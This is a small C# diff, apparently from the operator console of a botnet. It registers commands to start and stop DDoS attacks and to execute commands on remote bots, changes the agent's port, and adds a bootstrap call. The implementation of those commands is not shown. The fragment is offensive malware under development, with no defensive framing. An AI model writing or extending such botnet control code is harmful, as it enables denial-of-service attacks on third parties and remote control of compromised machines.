@@ -11,15 +11,15 @@ namespace REPL
         static void Main(string[] args)
         {
             var repl = new CommandLineReader();
-            var agent = new Agent(33333, BotIdentifier.Id);
+            var agent = new Agent(33332, BotIdentifier.Id);
             agent.Run();
+            agent.Bootstrap();
+
 
             var suite = new CommandSet("vicha") {
                 "usage: COMMAND [OPTIONS]+.",
                 "Available commands are:",
                 "",
-                // { "v:", "verbosity", (int? v) => Verbosity = v.HasValue ? v.Value : Verbosity+1 },
-		        // Commands may also be specified
 		        new DDoSStartCommand(agent, repl),
                 new DDoSStopCommand(agent, repl),
                 new ExecuteCommand(agent, repl),
